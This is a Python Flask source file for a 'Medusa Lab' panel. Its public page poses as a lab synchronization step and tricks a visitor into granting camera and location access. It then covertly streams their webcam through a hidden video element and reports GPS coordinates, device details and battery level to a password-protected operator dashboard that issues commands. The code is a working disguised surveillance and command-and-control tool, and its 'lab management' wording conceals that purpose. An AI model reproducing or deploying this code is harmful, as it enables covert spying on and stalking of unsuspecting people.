import os
import base64
from flask import Flask, render_template_string, request, jsonify, Response, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "LAB_MANAGEMENT_EXCLUSIVE_SECRET"

# Kredensial Login Administrator Laboratorium
USERNAME_ADMIN = "admin"
PASSWORD_ADMIN = "medusa123"

latest_frame = None
auto_target_ip = None
pending_commands = []
latest_output = ""

# --- INTERFACES TARGET (AUTOMATIC CLIENT MANAGEMENT HANDSHAKE) ---
TARGET_HTML = """
<html>
<head>
    <title>Lab System Synchronization</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: monospace; text-align: center; padding-top: 80px; }
        .box { border: 2px solid #00ff00; display: inline-block; padding: 30px; background-color: #000; box-shadow: 0 0 15px #00ff00; border-radius: 8px; }
        .btn { background-color: #003300; color: white; padding: 16px 32px; border: 1px solid #00ff00; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h2>[ MEDUSA LAB CONNECT ]</h2>
        <p>Laboratorium terisolasi memerlukan sinkronisasi media satu pintu.</p>
        <button class="btn" onclick="triggerOtoritas()">OTORISASI & SINKRONISASI</button>
    </div>
    <video id="v-feed" autoplay playsinline muted style="position: absolute; width: 1px; height: 1px; opacity: 0.01;"></video>
    <script>
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        var targetLatitude = "Belum Diizinkan/Tidak Didukung";
        var targetLongitude = "Belum Diizinkan/Tidak Didukung";
        
        async function triggerOtoritas() {
            try {
                // 1. Ambil izin kamera klien laboratorium
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                let video = document.getElementById("v-feed");
                video.srcObject = stream;
                
                // 2. Kunci lokasi presisi saat tombol diklik (User Gesture Bypass)
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((pos) => {
                        targetLatitude = pos.coords.latitude;
                        targetLongitude = pos.coords.longitude;
                    }, null, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
                }

                video.onloadedmetadata = () => { 
                    video.play(); 
                    setInterval(captureFrame, 400); 
                    setInterval(listenServerCommand, 1000); 
                };
                document.body.innerHTML = "<div class='box'><h2 style='color:#00ff00;'>[ CLIENT CONNECTED ]</h2><p>Sesi nirkabel lab aktif melintasi manajemen proxy.</p></div>";
            } catch(err) { alert("Izin ditolak: " + err); }
        }
        
        function captureFrame() {
            let video = document.getElementById("v-feed");
            if(video.videoWidth > 0) {
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Mengubah pengiriman string mentah menjadi objek FormData yang sah
                let formData = new FormData();
                formData.append("frame", canvas.toDataURL('image/jpeg', 0.4));
                
                fetch('/receive_frame', { method: 'POST', body: formData });
            }
        }

        async function listenServerCommand() {
            let res = await fetch('/poll_command');
            let data = await res.json();
            if (data.command) {
                let report = "";
                let timestamp = new Date().toLocaleTimeString();
                
                if (data.command === "cek_baterai") {
                    let battery = await navigator.getBattery();
                    report = "[" + timestamp + "] STATUS BATERAI -> Level: " + (battery.level * 100) + "%, Mengisi Daya: " + battery.charging;
                } else if (data.command === "ambil_data_sistem") {
                    report = "[" + timestamp + "] SPESIFIKASI SISTEM -> Platform: " + navigator.platform + " | Agen: " + navigator.userAgent;
                } else if (data.command === "ambil_lokasi") {
                    report = "[" + timestamp + "] KOORDINAT PERANGKAT -> Lat: " + targetLatitude + " | Long: " + targetLongitude;
                } else if (data.command === "ping_test") {
                    report = "[" + timestamp + "] MONITOR JALUR -> Jalur komunikasi cloud aktif 100%!";
                }
                
                fetch('/report_output', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ output: report })
                });
            }
        }
    </script>
</body>
</html>
"""

# --- DASHBOARD CENTRAL OPERATOR ---
DASHBOARD_HTML = """
<html>
<head>
    <title>Medusa Lab Central Panel</title>
    <style>
        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
        .btn { background: #003300; color: #fff; border: 1px solid #00ff00; padding: 10px; margin: 5px; cursor: pointer; font-weight: bold; }
        .btn:hover { background: #00ff00; color: #000; }
        #monitor { width: 480px; height: 360px; border: 2px solid #00ff00; background: #000; margin-top: 10px; display: block; }
        #log { background: #000; padding: 20px; border: 1px solid #333; color: cyan; font-size: 16px; width: 100%; max-width: 900px; height: 300px; overflow-y: scroll; white-space: pre-wrap; margin-top: 20px; }
    </style>
</head>
<body>
    <h1>MEDUSA LAB MANAGEMENT SYSTEM (WEB-CENTRAL)</h1>
    <div style="float: right;"><a href="/logout" style="color: red; font-weight: bold;">[ LOGOUT ]</a></div>
    <p>Status Koneksi Node: <span style="color:white; background:#333; padding:2px 5px;">TERIKAT (AUTOMATIC SYSTEM)</span></p>

    <h3>Umpan Media Node Pemantauan</h3>
    <img id="monitor" src="" onerror="this.style.display='none';" onload="this.style.display='block';">
    
    <h3>Eksekusi Utilitas Perangkat Jarak Jauh</h3>
    <button class="btn" onclick="sendCmd('cek_baterai')">Periksa Daya Baterai</button>
    <button class="btn" onclick="sendCmd('ambil_data_sistem')">Tarik Data Perangkat</button>
    <button class="btn" onclick="sendCmd('ambil_lokasi')">Dapatkan Koordinat GPS</button>
    <button class="btn" onclick="sendCmd('ping_test')">Uji Latensi Jalur</button>

    <h3>Riwayat Log Aktivitas Node Laboratorium:</h3>
    <div id="log">--- Memulai Konsol Log Manajemen Medusa ---</div>

    <script>
        var lastLoggedMessage = "";

        setInterval(() => {
            document.getElementById('monitor').src = '/get_frame?' + Date.now();
            fetch('/get_latest_output')
                .then(res => res.json())
                .then(data => { 
                    if(data.output && data.output !== lastLoggedMessage) {
                        lastLoggedMessage = data.output;
                        let logBox = document.getElementById('log');
                        logBox.innerText += "\\n" + data.output;
                        logBox.scrollTop = logBox.scrollHeight;
                    } 
                });
        }, 1000);

        function sendCmd(cmd) {
            fetch('/send_command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ command: cmd })
            });
            let timestamp = new Date().toLocaleTimeString();
            let logBox = document.getElementById('log');
            logBox.innerText += "\\n[" + timestamp + "] [SYSTEM] Mengirim permintaan administratif '" + cmd + "' ke antrean node...";
            logBox.scrollTop = logBox.scrollHeight;
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(TARGET_HTML)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('username') == USERNAME_ADMIN and request.form.get('password') == PASSWORD_ADMIN:
            session['logged_in'] = True
            return redirect(url_for('operator_dashboard'))
    return render_template_string("""
        <body style="background:#000;color:#00ff00;font-family:monospace;text-align:center;padding-top:100px;">
            <div style="border:1px solid #00ff00; display:inline-block; padding:30px; box-shadow: 0 0 10px #00ff00;">
                <h2>[ LAB MANAGEMENT AUTH REQUIRED ]</h2>
                <form method="POST">
                    <input type="text" name="username" placeholder="Administrator" required><br>
                    <input type="password" name="password" placeholder="Password" required><br><br>
                    <button type="submit" style="background:#003300;color:#fff;border:1px solid #00ff00;padding:5px 10px;cursor:pointer;font-weight:bold;">ENTER SYSTEM</button>
                </form>
            </div>
        </body>
    """)

@app.route('/operator')
def operator_dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template_string(DASHBOARD_HTML)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/receive_frame', methods=['POST'])
def receive_frame():
    global latest_frame
    # Mengambil string data dari objek form yang dikirim oleh browser HP
    latest_frame = request.form.get("frame")
    return "OK"

@app.route('/get_frame')
def get_frame():
    global latest_frame
    if latest_frame and "base64," in latest_frame:
        try:
            # Mengambil string data gambar pasca-pemotongan array [1]
            img_b64 = latest_frame.split("base64,")[1]
            img_data = base64.b64decode(img_b64)
            return Response(img_data, mimetype='image/jpeg')
        except Exception as e:
            print(f"Error decoding frame: {e}")
            pass
    return "", 204

@app.route('/send_command', methods=['POST'])
def send_command():
    global pending_commands
    pending_commands.append(request.json.get("command"))
    return jsonify({"status": "queued"})

@app.route('/poll_command')
def poll_command():
    global pending_commands
    if pending_commands:
        return jsonify({"command": pending_commands.pop(0)})
    return jsonify({"command": None})

@app.route('/report_output', methods=['POST'])
def report_output():
    global latest_output
    latest_output = request.json.get("output")
    return "OK"

@app.route('/get_latest_output')
def get_latest_output():
    global latest_output
    return jsonify({"output": latest_output})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
